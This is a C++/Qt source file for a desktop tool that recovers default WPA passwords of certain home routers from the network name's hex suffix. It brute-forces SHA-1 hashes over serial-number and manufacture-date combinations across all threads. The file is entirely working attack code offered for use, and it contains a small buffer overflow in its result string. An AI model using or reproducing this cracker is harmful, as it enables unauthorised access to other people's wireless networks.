#include "Crack.h"
#include "unknown.h"
#include <time.h>
#include <string.h>
#include <openssl/sha.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <omp.h>
#include <sstream>
#include <iomanip>
#include <QFuture>
#include <QtConcurrentRun>
#include <QMutex>


Crack::Crack(QWidget *parent)
    : QWidget(parent) , running(false)
{
    setupUi(this);
    QRegExp rx("[a-fA-F0-9]{6}");
    QValidator *validator = new QRegExpValidator(rx, this);
    lineEdit->setValidator(validator);
    connect( calc , SIGNAL( clicked() ), this , SLOT(process()) );
    connect( lineEdit , SIGNAL( returnPressed() ), this , SLOT(process()) );
    connect( &watcher, SIGNAL(finished()),  this , SLOT(finished()));
}

void Crack::process()
{
  int pos;
  QString input = lineEdit->text();
  if ( lineEdit->validator()->validate( input , pos ) != QValidator::Acceptable )
  {
    output->setText("ESSID code not valid!");
    return;
  }
  else
    if ( !running )
      output->setText("Calculating...");
    else
      output->setText("Already running!");
  this->running = true;
  uint32_t essid = input.toInt(NULL , 16 );
  QFuture<void> future = QtConcurrent::run( crack , essid );
  watcher.setFuture( future);
}

void Crack::finished()
{
 // this->output->append( watcher.future().result().str().c_str() );
  running = false;
}

void crack( uint32_t essid )
{

  time_t begin = time(NULL);
  std::ostringstream out;
  int n = sizeof(dic)/sizeof("AAA");

  #pragma omp parallel
  {
  uint8_t message_digest[SHA_DIGEST_LENGTH];
  char unknown[7] , input[13] , result[10];
  SHA_CTX sha1;
  input[0] = 'C';
  input[1] = 'P';
  uint32_t * ptr = (uint32_t *)malloc(sizeof(uint32_t));
   #pragma omp for
  for(int i = 0 ; i < n; ++i)
  {
   sprintf( unknown , "%02X%02X%02X" , (int)dic[i][0]
               , (int)dic[i][1], (int)dic[i][2] );
   for ( int year = 4 ; year <= 10 ; ++year )
   {
     for ( int week = 1 ; week <= 52 ; ++week )
     {

       if ( year < 10 )
       {
         input[2] = '0';
         input[3] = '0' + year;
       }
       else
       {
         input[2] = '1';
         input[3] = '0' + year - 10 ;
       }
       if ( week < 10 )
       {
           input[4] = '0';
           input[5] = '0' + week;
       }
       else
       {
         input[4] = '0' + week / 10;
         input[5] = '0' + week - ( input[4] - '0' )*10;
       }
       strcpy( input + 6 , unknown);
       SHA1_Init(&sha1);
       SHA1_Update(&sha1 ,(const void *) input , 12 );
       SHA1_Final(message_digest , &sha1 );
       /*
        * Had to copy the result backwards to match the corret response
        * No idea why.. But heard about it in some forum...
        */
       memcpy(((uint8_t *)ptr) , message_digest + 19 , 1);
       memcpy(((uint8_t *)ptr) + 1, message_digest + 18 , 1);
       memcpy(((uint8_t *)ptr) + 2, message_digest + 17 , 1);

       if ( (*ptr) == essid )
       {
         //for ( int j = 0 ; j < 5 ; ++j )
           //out << std::hex << std::setw(2) << std::uppercase << std::setfill('0') << (int)message_digest[j];
         //out << std::endl;
        // cra->output->append(out.str().c_str() );
         //out.str("");
         #pragma omp critical
         sprintf( result , "%02X%02X%02X%02X%02X\n" , (int)message_digest[0] , (int)message_digest[1] ,
             (int)message_digest[2] , (int)message_digest[3] , (int)message_digest[4]);
         printf("WPA: %s" , result);
       }
     }
   }
  }
  free(ptr);

  }
  printf(  "time: %d\n" , (int)(time(NULL) - begin) );
}

Crack::~Crack()
{

}
